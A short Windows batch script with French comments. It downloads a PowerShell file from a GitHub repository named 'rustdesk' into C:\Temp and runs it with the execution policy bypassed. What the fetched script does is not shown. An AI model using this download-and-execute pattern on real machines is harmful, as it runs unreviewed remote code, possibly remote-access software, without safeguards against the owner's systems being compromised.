@echo off


set "url=https://raw.githubusercontent.com/loupirr/rustdesk/main/test.ps1"
set "local=C:\Temp\test.ps1"

REM Crée C:\Temp s'il n'existe pas
if not exist "C:\Temp" (
    echo Creation du dossier C:\Temp...
    mkdir "C:\Temp"
)

echo Downloading %url% to %local%...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%local%' -UseBasicParsing"

echo Executing the downloaded script...
powershell -NoProfile -ExecutionPolicy Bypass -File "%local%"

pause
